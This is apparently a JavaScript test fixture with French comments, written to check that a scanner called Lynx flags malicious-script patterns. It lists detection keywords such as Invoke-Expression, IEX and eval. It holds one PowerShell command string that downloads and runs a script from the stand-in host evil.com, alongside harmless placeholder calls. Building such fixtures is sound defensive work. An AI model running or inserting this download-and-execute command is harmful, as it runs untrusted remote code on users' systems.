// Malicious Script Sample - DEMONSTRATION ONLY
// Ce fichier contient des patterns de scripts malveillants pour tester Lynx

// Patterns détectés :
// - Invoke-Expression
// - IEX
// - eval(
// - exec(
// - system(

// Code malveillant simulé
function maliciousFunction() {
    var payload = "Invoke-Expression payload";
    var command = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')";
    
    // Fonction eval dangereuse
    eval("console.log('malicious code executed')");
    
    // Exécution de commande
    exec("system command execution");
    
    // Appel système
    system("malicious system call");
    
    return "malicious script completed";
}

// Fonction principale
function main() {
    console.log("Démarrage du script malveillant");
    maliciousFunction();
    console.log("Script malveillant terminé");
}

main(); 